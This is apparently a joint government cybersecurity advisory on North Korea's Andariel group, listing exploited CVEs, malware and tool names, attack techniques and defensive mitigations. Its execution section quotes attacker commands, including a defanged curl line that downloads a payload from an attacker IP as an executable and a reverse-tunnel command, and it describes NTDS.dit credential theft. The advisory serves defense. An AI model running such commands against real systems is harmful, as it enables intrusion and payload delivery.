The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime\u2019s military and nuclear programs and ambitions. The authoring agencies believe the group and the cyber techniques remain an ongoing threat to various industry sectors worldwide, including but not limited to entities in their respective countries, as well as in Japan and India. RGB 3rd Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.\nThe actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation. The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks, and perform privilege escalation using common credential stealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.\u00a0\nThe actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.\nThe authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and strengthen authentication and remote access protections. While not exclusive, entities involved in or associated with the below industries and fields should remain vigilant in defending their networks from North Korea state-sponsored cyber operations:\nFor additional information on DPRK state-sponsored malicious cyber activity, see CISA\u2019s North Korea Cyber Threat Overview and Advisories webpage.\nDownload the PDF version of this report:\n\n\nAA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime\u2019s Military and Nuclear Programs\n(PDF,       801.28 KB\n  )\n\n\nFor a downloadable copy of associated indicators of compromise (IOCs), see:\n\n\nAA24-207A STIX XML\n(XML,       296.99 KB\n  )\n\n\n\n\nAA24-207A STIX JSON\n(JSON,       140.84 KB\n  )\n\n\nTechnical Details\nRGB 3rd Bureau\nAndariel (also known as Onyx Sleet, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.\nCyber Espionage\nThe actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. See Table 1 for more victimology information.\n\n\nTable 1.

For more information on this ransomware activity, see joint advisories #StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities and North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector.\nMalicious Cyber Espionage Activity\nThis advisory uses the MITRE ATT&CK for Enterprise framework, version 15. See the Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.\nReconnaissance and Enumeration\nWhile there is limited available information on the group\u2019s initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers [T1595, T1592]. The actors gather open source information about their victims for use in targeting [T1591] and research Common Vulnerabilities and Exposures (CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database [T1596]. CVEs researched include:\n\nCVE-2023-46604 \u2013 Apache ActiveMQ\nCVE-2023-42793 \u2013 TeamCity\u00a0\nCVE-2023-3519 \u2013 Citrix NetScaler\nCVE-2023-35078 \u2013 Ivanti Endpoint Manager Mobile (EPMM)\u00a0\nCVE-2023-34362 \u2013 MOVEIt\u00a0\nCVE-2023-33246 \u2013 RocketMQ\u00a0\nCVE-2023-32784 \u2013 KeePass\u00a0\nCVE-2023-32315 \u2013 Openfire\u00a0\nCVE-2023-3079 \u2013 Google Chromium V8 Type Confusion\nCVE-2023-28771 and CVE-2023-33010 \u2013 Zyxell firmware\nCVE-2023-2868 \u2013 Barracuda Email Security Gateway\nCVE-2023-27997 \u2013 FortiGate SSL VPN\u00a0\nCVE-2023-25690 \u2013 Apache HTTP Server\nCVE-2023-21932 \u2013 Oracle Hospitality Opera 5\nCVE-2023-0669 \u2013 GoAnywhere MFT\nCVE-2022-47966 \u2013 ManageEngine\u00a0\nCVE-2022-41352 and CVE-2022-27925 \u2013 Zimbra Collaboration Suite\nCVE-2022-30190 \u2013 Microsoft Windows Support Diagnostic Tool\nCVE-2022-25064 \u2013 TP-LINK\u00a0\nCVE-2022-24990 and CVE-2021-45837 \u2013 TerraMaster NAS\nCVE-2022-24785 \u2013 Moment.js\u00a0\nCVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 \u2013 PHP Everywhere\u00a0\nCVE-2022-22965 \u2013 Spring4Shell\nCVE-2022-22947 \u2013 Spring Cloud Gateway\u00a0\nCVE-2022-22005 \u2013 Microsoft SharePoint Server\u00a0\nCVE-2022-21882 \u2013 Win32k Elevation of Privilege\u00a0\nCVE-2021-44228 \u2013 Apache Log4j\u00a0\nCVE-2021-44142 \u2013 Samba vfs_fruit module\u00a0\nCVE-2021-43226, CEV-2021-43207, CVE-2021-36955 \u2013 Windows log file vulnerabilities\nCVE-2021-41773 \u2013 Apache HTTP Server 2.4.49\nCVE-2021-40684 \u2013 Talend ESB Runtime\u00a0\nCVE-2021-3018 \u2013 IPeakCMS 3.5\u00a0\nCVE-2021-20038 \u2013 SMA100 Apache httpd server (SonicWall)\u00a0\nCVE-2021-20028 \u2013 SonicWall Secure Remote Access (SRA)\u00a0\nCVE-2019-15637 \u2013 Tableau\u00a0\nCVE-2019-7609 \u2013 Kibana\nCVE-2019-0708 \u2013 Microsoft Remote Desktop Services\u00a0\nCVE-2017-4946 \u2013 VMware V4H and V4PA\n\nResource Development, Tooling, and Remote Access Tools\nThe actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.\n\nAtharvan\nELF Backdoor\nJupiter\nMagicRAT\n\u201cNo Pineapple\u201d\nTigerRAT\nValefor/VSingle\nValidAlpha\nYamaBot\nNukeSped\nGoat RAT\nBlack RAT\nAndarLoader\nDurianBeacon\nTrifaux\nKaosRAT\nPreft\nAndariel Scheduled Task Malware\nBottomLoader (see Cisco Talos blog Operation Blacksmith)\nNineRAT (see Cisco Talos blog Operation Blacksmith)\nDLang (see Cisco Talos blog Operation Blacksmith)\nNestdoor (see AhnLab blog)\n\nThese tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) [T1587.001, T1587.004]. The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.\nCommodity Malware\nCommodity malware is malicious software widely available for purchase or use and is leveraged by numerous different threat actors. The use of publicly available malware enables the actors to conceal and obfuscate their identities and leads to attribution problems. The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved great success leveraging just open source malware. The authoring agencies have identified the following open-source tools as used and/or customized by the actors:\n\n3Proxy [T1090]\nAdFind [S0552]\nAsyncRAT\nDeimosC2\nImpacket [T1090]\nJuggernaut [T1040]\nLilith RAT\nORVX Web Shell\nMimikatz [S0002]\nPLINK [T1572]\nProcDump [T1003]\nPuTTY [T1572]\nSOCKS5 [T1090]\nStunnel [T1572]\u00a0\nWeb Shell by Orb (WSO)\nWinRAR [T1560]\nWinSCP [T1048]\nRDP Wrapper [T1572]\n\nInitial Access\nThe actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (\u201cLog4Shell\u201d) in Apache\u2019s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further exploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously [T1190].\nExecution\nThe actors are well-versed in using native tools and processes on systems, known as living off the land (LOTL). They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration. While individual commands typically vary, the authoring agencies assess the actors prefer netstat commands, such as netstat \u2013naop and netstat \u2013noa [T1059]. Example commands used by the actors include the following:\n\nnetstat \u2013naop\u00a0\nnetstat \u2013noa\npvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] <Remote_IP>\ncurl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe\nC:\\windows\\system32\\cmd.exe /c systeminfo | findstr Logon\n\nThese actors often make typos and other mistakes, indicating that the commands are not directly copied from a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as \u201cMicrosoft Cooperation\u201d (rather than \u201cMicrosoft Corporation\u201d) found across numerous RGB 3rd Bureau malware samples.\nDefense Evasion\nThe actors routinely pack late-stage tooling in VMProtect and Themida. Malicious tooling packed with these and other commercial tools have advanced anti-debugging and detection capabilities. These files are typically multiple megabytes in size and often contain unusual file section names such as vmp0 and vmp1 for VMProtect and Themida or randomized file section names for Themida [T1027].\nCredential Access\nThe actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft tools such as Mimikatz, ProcDump, and Dumpert and accessing the Active Directory domain database through targeting of the NTDS.dit file. The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials. In one instance, the actors used the vssadmin command-line utility to back up a volume to retrieve a copy of the NTDS.dit file containing Active Directory data. In another instance, the actors were observed collecting registry hive data for offline extraction of credentials [T1003].\nDiscovery\nThe actors used customized file system enumeration tooling written in .NET. The tool is capable of receiving and executing command line arguments to enumerate directories and files and compress output files. The tool collects the following information for each drive targeted on a system: depth relative to starting path, name, last write time, last access time, creation time, size, and attributes [T1087, T1083].\u00a0\nThe actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network [T1021.002].\nLateral Movement\nThe actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the %Temp% directory.\nThe actors have also used Remote Desktop Protocol (RDP) to move laterally [T1021].\nCommand and Control\nThe actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems. The actors disguise their malware within HTTP packets to appear as benign network traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. Tunneling enables the actors to perform C2 operations despite network configurations that would typically pose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy [T1090, T1071].\nCollection and Exfiltration\nMalware previously used by the actors permitted placement and access to search through files that could be of interest, including scanning computer files for keywords related to defense and military sectors in English and Korean. The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools. The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim\u2019s environment with other malicious tooling [T1560, T1039].\nThe actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2. Notably, the actors have been observed logging into actor-controlled cloud-based storage service accounts directly from victim networks to exfiltrate data [T1567]. The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols [T1048].\nThe actors

posture based on the threat actors\u2019 activity.\nLog4Shell and Other Log4j Vulnerabilities\nDefenders should consult the joint Cybersecurity Advisory titled \u201cMitigating Log4Shell and Other Log4j-Related Vulnerabilities\u201d and CISA\u2019s \u201cApache Log4j Vulnerability\u201d guidance. Organizations can mitigate the risks posed by the vulnerability by identifying assets affected by Log4Shell and other Log4j-related vulnerabilities and upgrading Log4j assets and affected products to the latest version.\u00a0\nNote: CVE-2021-44228 \u2018Log4Shell\u2019 was disclosed in December 2021 and affects the Log4j library prior to version 2.17.0.\nDefenders should remain alert to vendor software updates, and initiate hunt and incident response procedures to detect possible Log4Shell exploitation.\nWeb Shell Malware\nWeb shell malware is deployed by adversaries on a victim\u2019s web server to execute arbitrary system commands. The NSA and Australian Signals Directorate\u2019s report titled \u201cDetect and Prevent Web Shell Malware\u201d provides mitigating actions to identify and recover from web shells.\nPreventing exploitation of web-facing servers often depends on maintaining an inventory of systems and applications, rapidly applying patches as they are released, putting vulnerable or potentially risky systems behind reverse proxies that require authentication, and deploying and configuring Web Application Firewalls (WAFs).\nEndpoint Activity\nPreventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms, blocking unnecessary outbound connections, blocking external access to administrator panels and services or turning them off entirely, and segmenting the network to prevent lateral movement from a compromised web server to critical assets.\nCommand Line Activity and Remote Access\nMonitoring for suspicious command-line activity, implementing multi-factor authentication for remote access services, and properly segmenting and using allow-listing tools for critical assets can protect against malicious activity by RGB 3rd Bureau\u2019s Andariel group and other cyber threat actors.\nPacking\nSignatures for Themida, VMProtect and a number of other packers are available here, however, the signatures will not identify every file packed using these applications.\n\nCheck for security vulnerabilities, apply patches, and update to the latest version of software\nEncrypt all sensitive data including personal information\nBlock access to unused ports\nChange passwords when they are suspected of being compromised\nStrengthen the subscriber identity authentication process for leased servers\n\nDPRK Rewards for Justice\nThe U.S. and ROK Governments encourage victims to report suspicious activities, including those related to suspected DPRK cyber activities, to relevant authorities. If you provide information about illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a reward. If you have information about illicit DPRK activities in cyberspace, including past or ongoing operations, providing such information through the Department of State\u2019s Rewards for Justice program could make you eligible to receive an award of up to $10 million.
